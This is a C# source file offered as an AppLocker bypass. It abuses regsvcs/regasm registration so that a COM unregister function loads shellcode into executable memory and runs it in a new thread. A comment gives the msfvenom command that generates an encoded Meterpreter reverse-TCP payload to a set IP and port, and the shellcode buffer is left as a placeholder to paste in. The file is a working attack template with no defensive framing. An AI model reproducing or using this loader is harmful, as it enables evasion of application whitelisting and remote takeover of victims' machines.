using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
[assembly: AssemblyKeyFileAttribute("meta.snk")]

namespace Bypass_Regsvc_regasm_AppLocker
{
    public class Bypass : ServicedComponent
    {
        static void Main()
        {

        }

        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("Follow the white rabbit!");
            
            // Shellcode
            // generated with:
            // msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.10.10" LPORT="443" -e x86/shikata_ga_nai -i 15 -f csharp

            !INSERTCODEHERE!
			

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }



        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}